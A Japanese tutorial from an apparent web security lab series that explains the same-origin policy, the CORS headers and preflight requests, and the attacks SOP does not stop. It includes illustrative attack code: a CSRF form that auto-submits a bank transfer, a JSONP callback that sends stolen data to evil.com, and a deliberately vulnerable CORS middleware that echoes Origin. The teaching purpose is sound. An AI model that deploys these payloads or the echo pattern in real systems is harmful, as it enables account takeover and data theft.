# 同一オリジンポリシーとCORS

> ブラウザが備える最も重要なセキュリティ機構である「同一オリジンポリシー（SOP）」と、それを制御された方法で緩和する「CORS」の仕組みを解説します。受動的攻撃を理解する上で不可欠な前提知識です。

---

## 能動的攻撃と受動的攻撃

Webアプリケーションに対する攻撃は、大きく2つに分類される。

### 能動的攻撃（Active Attack）

攻撃者が**直接サーバーに**悪意のあるリクエストを送信する攻撃。

```
攻撃者 ──────→ サーバー
       悪意のあるリクエスト
       (SQLインジェクション等)
```

例: SQLインジェクション、コマンドインジェクション、ブルートフォース攻撃

攻撃者自身がリクエストを送信するため、攻撃元のIPアドレスが記録される。サーバー側の入力検証やWAFで防御できる。

### 受動的攻撃（Passive Attack）

攻撃者が**被害者のブラウザを経由して**攻撃する手法。攻撃者は罠を仕掛け、被害者がそれを踏むのを待つ。

```
攻撃者 ──罠を設置──→ 罠サイト/罠メール
                         ↓ 被害者がアクセス
                      被害者のブラウザ ──→ 正規サーバー
                                    被害者の権限でリクエスト
```

例: XSS（クロスサイトスクリプティング）、CSRF（クロスサイトリクエストフォージェリ）

受動的攻撃では、**正規ユーザーのブラウザから正規のリクエストが送信される**ため、サーバーから見ると正常なリクエストと区別がつきにくい。ブラウザはこの種の攻撃を防ぐために**同一オリジンポリシー**を実装している。

---

## ブラウザのサンドボックス概念

ブラウザは信頼できないコード（Webページ上のJavaScript）を実行する環境である。ユーザーが訪問するWebサイトは攻撃者が運営するものかもしれないし、正規サイトにXSSで注入されたスクリプトかもしれない。

このため、ブラウザは**サンドボックス（砂場）**の概念でセキュリティを確保している。

| 制限 | 説明 |
|------|------|
| ファイルシステムアクセスの制限 | JavaScriptはユーザーのファイルを自由に読み書きできない |
| ネットワークアクセスの制限 | 同一オリジンポリシーにより、他のオリジンへのアクセスが制限される |
| OS機能へのアクセスの制限 | カメラやマイクは許可が必要、OSコマンドは実行不可 |
| 他のタブ/ウィンドウの分離 | 異なるオリジンのタブ同士はデータを共有できない |

同一オリジンポリシーは、このサンドボックスの中核をなすセキュリティ機構である。

---

## オリジンの定義

**オリジン（Origin）**は、以下の3つの要素の組み合わせで定義される。

```
オリジン = スキーム + ホスト + ポート
```

| URL | スキーム | ホスト | ポート | オリジン |
|-----|----------|--------|--------|----------|
| `https://example.com/page` | https | example.com | 443 | `https://example.com` |
| `http://example.com/page` | http | example.com | 80 | `http://example.com` |
| `https://api.example.com/data` | https | api.example.com | 443 | `https://api.example.com` |
| `https://example.com:8080/` | https | example.com | 8080 | `https://example.com:8080` |

### 同一オリジンの判定例

基準URL: `https://example.com/page1`

| 比較対象URL | 同一オリジン? | 理由 |
|-------------|---------------|------|
| `https://example.com/page2` | 同一 | パスが異なるだけ |
| `https://example.com:443/page2` | 同一 | httpsのデフォルトポートは443 |
| `http://example.com/page1` | **異なる** | スキームが異なる（https vs http） |
| `https://api.example.com/page1` | **異なる** | ホストが異なる（サブドメイン違い） |
| `https://example.com:8080/page1` | **異なる** | ポートが異なる |
| `https://example.org/page1` | **異なる** | ホストが異なる |

**重要**: サブドメインが異なれば別オリジンである。`example.com` と `api.example.com` は同一オリジンではない。

---

## 同一オリジンポリシー（SOP）の具体的な制限内容

同一オリジンポリシー（Same-Origin Policy, SOP）は、**あるオリジンから読み込まれたドキュメントやスクリプトが、別のオリジンのリソースにアクセスすることを制限する**ブラウザのセキュリティ機構である。

### DOMアクセスの制限

異なるオリジンのページのDOMにはアクセスできない。

```javascript
// https://evil.com のスクリプト
const iframe = document.createElement('iframe');
iframe.src = 'https://bank.example.com/account';
document.body.appendChild(iframe);

// 同一オリジンポリシーにより、iframeの中身にはアクセスできない
iframe.onload = () => {
  try {
    // ⚠️ SecurityError: 異なるオリジンのDOMにアクセスできない
    const balance = iframe.contentDocument.getElementById('balance').textContent;
    console.log(balance);  // 実行されない
  } catch (e) {
    console.error(e);  // "SecurityError: Blocked a frame with origin..."
  }
};
```

これがなければ、攻撃者のサイトにiframeで銀行サイトを埋め込み、ユーザーの残高情報を盗み出すことが可能になってしまう。

### XMLHttpRequest / fetch の制限

JavaScriptから異なるオリジンへのHTTPリクエストを送信し、その**レスポンスを読み取ること**が制限される。

```javascript
// https://evil.com のスクリプト
// 銀行サイトのAPIからデータを取得しようとする
fetch('https://bank.example.com/api/account', {
  credentials: 'include'  // 銀行サイトのCookieを送信
})
.then(response => response.json())
.then(data => {
  // ⚠️ SOPにより、レスポンスの読み取りがブロックされる
  // ブラウザコンソールに以下のエラーが表示される:
  // "Access to fetch at 'https://bank.example.com/api/account' from origin
  //  'https://evil.com' has been blocked by CORS policy"
  console.log(data);
});
```

**注意点**: SOPが制限するのは**レスポンスの読み取り**であり、**リクエストの送信自体は制限しない場合がある**。これがCSRF攻撃が成立する理由の一つである。単純なリクエスト（後述）はCORSプリフライトなしで送信され、サーバー側で処理されてしまう。

### Cookieの送信ルール

Cookieの送信はオリジン単位ではなく、**ドメインとパス**に基づいて制御される。

```
# Domain=example.com のCookieは以下に送信される:
example.com         → 送信される
sub.example.com     → 送信される（サブドメインにも送信）
other.com           → 送信されない

# Domain属性なしのCookieは設定元のドメインにのみ送信
# (サブドメインには送信されない)
```

さらに、`SameSite` 属性がクロスサイトリクエストでのCookie送信を制御する:

| SameSite値 | 同一サイトリクエスト | クロスサイトGET（トップレベル） | クロスサイトPOST |
|------------|---------------------|-------------------------------|-----------------|
| Strict | 送信 | **不送信** | **不送信** |
| Lax | 送信 | 送信 | **不送信** |
| None | 送信 | 送信 | 送信 |

---

## CORS（Cross-Origin Resource Sharing）の仕組み

### なぜCORSが必要か

同一オリジンポリシーは安全性を提供するが、**正当なクロスオリジン通信まで制限してしまう**。

現代のWebアプリケーションでは、フロントエンドとAPIが異なるオリジンにあることが一般的である:

```
フロントエンド: https://app.example.com     (ポート443)
API:          https://api.example.com     (ポート443、異なるホスト)

ローカル開発:
フロントエンド: http://localhost:5173       (Vite)
API:          http://localhost:3000       (Hono、異なるポート)
```

SOPのままでは、フロントエンドからAPIへの `fetch` リクエストのレスポンスが読めない。CORSは、サーバーが**「このオリジンからのアクセスは許可する」**と明示的に宣言することで、SOPを安全に緩和する仕組みである。

### Access-Control-Allow-Origin ヘッダ

CORSの最も基本的なヘッダ。サーバーがレスポンスに含めることで、どのオリジンからのアクセスを許可するかを宣言する。

```
# サーバーのレスポンス
HTTP/1.1 200 OK
Access-Control-Allow-Origin: https://app.example.com
Content-Type: application/json

{"data": "secret"}
```

ブラウザの動作:

1. `https://app.example.com` のスクリプトが `https://api.example.com` にリクエストを送信
2. サーバーがレスポンスに `Access-Control-Allow-Origin: https://app.example.com` を含めて返す
3. ブラウザが「リクエスト元のオリジン」と「Access-Control-Allow-Origin の値」を比較する
4. 一致すれば、JavaScriptにレスポンスを渡す。不一致ならブロックする

```javascript
// https://app.example.com のスクリプト
const response = await fetch('https://api.example.com/data');
// サーバーが Access-Control-Allow-Origin: https://app.example.com を返せば成功
const data = await response.json();
```

### ワイルドカード（*）の使用

```
Access-Control-Allow-Origin: *
```

すべてのオリジンからのアクセスを許可する。公開API（天気情報、為替レートなど）では有効だが、**認証情報を含むリクエストでは使用できない**（後述）。

### 単純リクエスト（Simple Request）の条件

以下のすべての条件を満たすリクエストは「単純リクエスト」として扱われ、**プリフライトリクエストなしで**直接送信される。

| 条件 | 許可される値 |
|------|-------------|
| メソッド | GET, HEAD, POST のいずれか |
| ヘッダ | Accept, Accept-Language, Content-Language, Content-Type のみ |
| Content-Type | `application/x-www-form-urlencoded`, `multipart/form-data`, `text/plain` のいずれか |

```
# 単純リクエストの例（プリフライトなし）
POST /api/data HTTP/1.1
Host: api.example.com
Origin: https://app.example.com
Content-Type: application/x-www-form-urlencoded

key=value
```

```
# 単純リクエストではない例（プリフライトが発生する）
POST /api/data HTTP/1.1
Host: api.example.com
Origin: https://app.example.com
Content-Type: application/json          ← JSONは単純リクエストの条件外
X-Custom-Header: value                  ← カスタムヘッダは条件外

{"key": "value"}
```

**セキュリティ上の意味**: 単純リクエストの条件は、HTMLフォームで送信可能なリクエストと一致するように設計されている。フォーム送信はSOP導入以前から可能だったため、後方互換性のためにプリフライトなしで送信される。つまり、**単純リクエストに該当するPOSTリクエストは、CORSの有無に関係なくサーバーに到達する**。これはCSRF攻撃に直結する。

### プリフライトリクエスト（OPTIONS）の詳細

単純リクエストの条件を満たさないリクエストを送信する前に、ブラウザは自動的に**プリフライトリクエスト**を送信する。これは `OPTIONS` メソッドを使った「事前確認」である。

```
# ステップ1: ブラウザが自動的にプリフライトリクエストを送信
OPTIONS /api/data HTTP/1.1
Host: api.example.com
Origin: https://app.example.com
Access-Control-Request-Method: POST
Access-Control-Request-Headers: Content-Type, X-Custom-Header

# ステップ2: サーバーがプリフライトに応答
HTTP/1.1 204 No Content
Access-Control-Allow-Origin: https://app.example.com
Access-Control-Allow-Methods: GET, POST, PUT, DELETE
Access-Control-Allow-Headers: Content-Type, X-Custom-Header
Access-Control-Max-Age: 86400

# ステップ3: プリフライトが許可されたので、実際のリクエストを送信
POST /api/data HTTP/1.1
Host: api.example.com
Origin: https://app.example.com
Content-Type: application/json
X-Custom-Header: value

{"key": "value"}

# ステップ4: サーバーが実際のレスポンスを返す
HTTP/1.1 200 OK
Access-Control-Allow-Origin: https://app.example.com
Content-Type: application/json

{"result": "success"}
```

プリフライトレスポンスの各ヘッダの意味:

| ヘッダ | 説明 |
|--------|------|
| `Access-Control-Allow-Origin` | 許可するオリジン |
| `Access-Control-Allow-Methods` | 許可するHTTPメソッド |
| `Access-Control-Allow-Headers` | 許可するリクエストヘッダ |
| `Access-Control-Max-Age` | プリフライト結果のキャッシュ時間（秒） |

curlでプリフライトリクエストをシミュレートする:

```bash
# プリフライトリクエストの手動送信
curl -v -X OPTIONS http://localhost:3000/api/data \
  -H "Origin: http://localhost:5173" \
  -H "Access-Control-Request-Method: POST" \
  -H "Access-Control-Request-Headers: Content-Type"
```

### 認証付きクロスオリジンリクエスト（credentials: 'include'）

デフォルトでは、クロスオリジンの `fetch` リクエストにCookieは含まれない。Cookieを送信するには、クライアント側で `credentials: 'include'` を指定し、サーバー側でも明示的に許可する必要がある。

```javascript
// クライアント側: credentials: 'include' でCookieを送信
const response = await fetch('https://api.example.com/profile', {
  credentials: 'include'  // クロスオリジンリクエストにCookieを含める
});
```

```
# サーバー側のレスポンスに必要なヘッダ
HTTP/1.1 200 OK
Access-Control-Allow-Origin: https://app.example.com
Access-Control-Allow-Credentials: true
Content-Type: application/json
```

### Access-Control-Allow-Credentials と Access-Control-Allow-Origin: * の関係

**重要な制約**: `Access-Control-Allow-Credentials: true` を返す場合、`Access-Control-Allow-Origin` に `*`（ワイルドカード）を使用することはできない。

```
# ⚠️ 無効な組み合わせ — ブラウザがブロックする
Access-Control-Allow-Origin: *
Access-Control-Allow-Credentials: true
```

この制約がないと、**任意のオリジンから認証付きリクエストが可能**になり、攻撃者のサイトから被害者のCookieを使ってAPIを呼び出し、レスポンス（個人情報等）を窃取できてしまう。

```
# ✅ 正しい設定: 具体的なオリジンを指定
Access-Control-Allow-Origin: https://app.example.com
Access-Control-Allow-Credentials: true
```

この制約を回避しようとして、リクエストの `Origin` ヘッダの値をそのまま `Access-Control-Allow-Origin` にエコーバックするパターンは**重大な脆弱性**（CORS misconfiguration）となる:

```typescript
// ⚠️ 危険: リクエストのOriginをそのまま反映
app.use('*', async (c, next) => {
  await next();
  const origin = c.req.header('Origin');
  c.res.headers.set('Access-Control-Allow-Origin', origin ?? '*');
  c.res.headers.set('Access-Control-Allow-Credentials', 'true');
  // → 攻撃者のオリジン https://evil.com からも認証付きアクセスが可能になる
});
```

```typescript
// ✅ 安全: 許可リストでオリジンを検証
const ALLOWED_ORIGINS = ['https://app.example.com', 'http://localhost:5173'];

app.use('*', async (c, next) => {
  await next();
  const origin = c.req.header('Origin');
  if (origin && ALLOWED_ORIGINS.includes(origin)) {
    c.res.headers.set('Access-Control-Allow-Origin', origin);
    c.res.headers.set('Access-Control-Allow-Credentials', 'true');
  }
});
```

---

## SOPの例外

同一オリジンポリシーには歴史的な理由による例外がある。以下の要素はクロスオリジンのリソースを**読み込む（埋め込む）**ことができる。

| HTML要素 | 読み込めるリソース | レスポンスの読み取り |
|----------|-------------------|---------------------|
| `<img src="...">` | 画像 | 読み取れない（表示のみ） |
| `<script src="...">` | JavaScript | 実行されるが、ソースコードは読み取れない |
| `<link rel="stylesheet" href="...">` | CSS | 適用されるが、CSSOMからの読み取りは制限される |
| `<iframe src="...">` | Webページ | 表示されるが、DOMにはアクセスできない |
| `<video>`, `<audio>` | メディア | 再生されるが、コンテンツの読み取りは制限される |
| `<form action="...">` | フォーム送信先 | リクエストは送信されるが、レスポンスは新しいページとして表示される |

### セキュリティ上の意味

これらの例外は攻撃に悪用される:

```html
<!-- CSRF: formタグで異なるオリジンにPOSTリクエストを送信 -->
<form action="https://bank.example.com/transfer" method="POST">
  <input type="hidden" name="to" value="attacker">
  <input type="hidden" name="amount" value="1000000">
</form>
<script>document.forms[0].submit();</script>

<!-- 情報窃取: imgタグでリクエストを送信（GETリクエスト + Cookie） -->
<img src="https://bank.example.com/api/check?account=12345" onerror="...">

<!-- scriptタグでJSONPを利用したデータ取得（レガシーな手法） -->
<script src="https://api.example.com/data?callback=steal"></script>
<script>
function steal(data) {
  // 取得したデータを攻撃者のサーバーに送信
  new Image().src = 'https://evil.com/collect?data=' + JSON.stringify(data);
}
</script>
```

---

## SOPとCORSが防ぐ攻撃、防げない攻撃

### 防ぐ攻撃

| 攻撃 | SOPがどう防ぐか |
|------|-----------------|
| クロスオリジンでのデータ窃取 | 攻撃者のサイトから `fetch` で被害者のデータを読み取ることをブロック |
| iframeによるDOM読み取り | 異なるオリジンのiframeのDOMにアクセスすることをブロック |
| CORS misconfiguration経由の情報漏洩 | 適切なCORS設定であれば、認証付きクロスオリジンリクエストのレスポンスをブロック |

### 防げない攻撃

| 攻撃 | SOPで防げない理由 |
|------|-------------------|
| **CSRF** | SOPはリクエストの**送信**を止めない。formタグやimgタグによるリクエスト送信はSOPの例外であり、Cookieも自動送信される。攻撃者はレスポンスを読む必要がなく、リクエストを送信させるだけで目的を達成する |
| **XSS** | XSSにより注入されたスクリプトは、被害者のページと**同じオリジン**で実行される。SOPの保護対象は「異なるオリジン」であるため、同一オリジン内のスクリプトには制限がかからない |
| **クリックジャッキング** | iframeで正規サイトを埋め込み、透明にして重ねる手法。SOPはiframeの表示自体は制限しない。`X-Frame-Options` や CSP `frame-ancestors` で対策する |
| **サーバーサイドの攻撃** | SQLインジェクション、コマンドインジェクション等はサーバー側の問題であり、ブラウザのSOPとは無関係 |
| **JSONP経由のデータ漏洩** | `<script>` タグでのクロスオリジン読み込みはSOPの例外。JSONPエンドポイントが残っていると、攻撃者がスクリプトとしてデータを取得できる |

### まとめ図

```
SOP/CORSの保護範囲:

  攻撃者のサイト ──fetch──→ 正規サイト
                           ↓
                        レスポンス ──→ ❌ ブロック（読み取り不可）

SOP/CORSで防げない範囲:

  攻撃者のサイト ──form POST──→ 正規サーバー
                               ↓
                            処理実行 → ✅ リクエストは到達する（CSRF）

  正規サイト内 ──XSSスクリプト──→ 同一オリジンのDOM/Cookie
                                  ↓
                               ✅ 同一オリジンなのでアクセス可能
```

---

## 開発環境での実践

sec-web-labの開発環境では、フロントエンド（`http://localhost:5173`）とバックエンド（`http://localhost:3000`）が異なるポートで動作するため、クロスオリジン通信になる。

```
フロントエンド: http://localhost:5173  (Vite + React)
バックエンド:   http://localhost:3000  (Hono)

→ ポートが異なるため別オリジン
→ フロントエンドからバックエンドへのfetchにはCORS設定が必要
```

開発環境ではViteのプロキシ設定やHono側のCORSミドルウェアで対応するが、この仕組みを理解していないと「なぜ開発中にCORSエラーが出るのか」「なぜ本番環境では出ないのか」が分からなくなる。

---

## 関連ラボ

以下のラボで、本ドキュメントの知識を実際に試すことができる:

### CORS設定の問題

| ラボ | 関連する知識 |
|------|--------------|
| [CORS Misconfiguration](../step06-server-side/cors-misconfiguration.md) | CORSの誤設定（Originエコーバック等）によるデータ窃取。Access-Control-Allow-Origin と Access-Control-Allow-Credentials の危険な組み合わせを体験する |

### 受動的攻撃

| ラボ | 関連する知識 |
|------|--------------|
| [CSRF](../step04-session/csrf.md) | SOPが防げない攻撃の代表例。フォーム送信がSOPの例外であること、Cookieの自動送信がCSRFを可能にすることを体験する |
| [XSS](../step02-injection/xss.md) | 注入されたスクリプトが同一オリジンで実行されるため、SOPの保護を受けられないことを体験する |
| [クリックジャッキング](../step07-design/clickjacking.md) | iframeによるクロスオリジン埋め込みがSOPの例外であることを悪用した攻撃を体験する |

### オープンリダイレクト

| ラボ | 関連する知識 |
|------|--------------|
| [オープンリダイレクト](../step02-injection/open-redirect.md) | リダイレクト先の検証不備により、信頼されたドメインからの遷移を装って攻撃者のサイトに誘導する手法 |

---

## 参考資料

- [MDN - 同一オリジンポリシー](https://developer.mozilla.org/ja/docs/Web/Security/Same-origin_policy)
- [MDN - CORS (Cross-Origin Resource Sharing)](https://developer.mozilla.org/ja/docs/Web/HTTP/CORS)
- [OWASP - CORS Misconfiguration](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/11-Client-side_Testing/07-Testing_Cross_Origin_Resource_Sharing)
- [RFC 6454 - The Web Origin Concept](https://datatracker.ietf.org/doc/html/rfc6454)
- [Fetch Standard - CORS Protocol](https://fetch.spec.whatwg.org/#http-cors-protocol)
